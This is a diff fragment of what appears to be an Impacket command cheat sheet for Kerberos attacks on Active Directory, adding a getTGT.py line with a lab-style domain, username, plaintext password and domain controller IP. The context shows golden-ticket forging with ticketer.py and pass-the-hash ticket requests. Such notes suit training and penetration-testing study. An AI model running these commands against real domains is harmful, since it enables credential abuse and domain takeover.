@@ -77,6 +77,7 @@ ticketer.py -aesKey AESKEY -domain-sid SID -domain DOMAIN administrator
 # getTGT.py
 getTGT.py DOMAIN/user:password
 getTGT.py DOMAIN/user -hashes LMHASH:NTHASH
+getTGT.py thm.loc/mary:'SuperLongForKerberos123!' -dc-ip 192.168.11.100
 
 # getST.py
 getST.py DOMAIN/user:password -spn cifs/server.domain.local
